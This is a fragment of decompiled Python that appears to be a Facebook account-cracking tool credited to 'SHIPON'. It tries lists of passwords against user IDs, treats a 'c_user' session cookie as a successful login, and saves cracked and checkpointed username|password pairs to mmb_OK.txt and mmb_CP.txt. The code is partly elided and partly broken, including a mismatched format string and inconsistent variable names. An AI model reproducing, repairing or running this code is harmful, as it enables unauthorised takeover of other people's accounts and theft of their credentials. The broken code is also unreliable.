...
# Time Succes decompile : 2022-07-24 14:52:39.992455
import os
try:
    import requests
except ImportError:
...
logo =                                          """   
  ...
  \033[1;92m╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;92m Author \x1b[1;97m : \033[1;92m           SHIPON
\033[1;31m\033[1;92m Facebook\x1b[1;97m:  \033[1;92m            Md. SHIPON 
\033[1;31m\033[1;92m GitHub\x1b[1;97m  : \033[1;92m           SHIPON
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mmmb_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mmmb_CP.txt' % (H, P, str(len(cp))))
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [mmb-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('mmb_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [mmb-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('mmb_CP.txt' , 'a').write('%s\n' % wrt)
                        break
